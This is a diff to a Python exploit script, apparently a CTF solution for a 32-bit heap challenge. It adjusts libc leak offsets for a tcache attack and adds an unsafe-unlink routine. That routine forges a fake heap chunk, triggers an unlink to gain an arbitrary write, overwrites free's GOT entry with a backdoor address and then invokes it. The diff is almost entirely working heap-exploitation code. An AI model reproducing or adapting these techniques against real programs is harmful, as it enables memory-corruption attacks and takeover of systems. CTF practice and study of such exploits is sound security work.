@@ -80,8 +80,8 @@ def tcache_attack_2():
         add(0, 0x300)
         add(1, 0xc)
         dele(0)
-        main_arena = u32(show(0, 0x4)) - 0x34
-        libc_base = main_arena - 0x13d7d4
+        main_arena = u32(show(0, 0x4))
+        libc_base = main_arena - 0x144818
         return libc_base
 
     libc.address = leak_lib()
@@ -105,6 +105,26 @@ def tcache_attack_2():
     sl('3')
     sl("echo pwned")
     
+def unsafe_unlink():
+    heap_arr = 0x21064 + 0x4*5
+    back_door = 0x106C4
+    add(5, 0x224)
+    add(6, 0x234)
+    add(7, 0xc)
+
+    edit(5, 0x225,flat([p32(0), p32(0x221),
+                        p32(heap_arr-0xc), p32(heap_arr-0x8),
+                        b'\x00'*0x210,
+                        p32(0x220), b'\x38'
+                        ]))
+
+    dele(6)
+    edit(5, 0x4, p32(elf.got['free']))
+    edit(2, 0x4, p32(back_door))
+    cmd('2')
+    ru("Enter index to free:\n")
+    sl("10086")
+
 if __name__ == '__main__':
-    tcache_attack_2()
+    unsafe_unlink()
     ia()
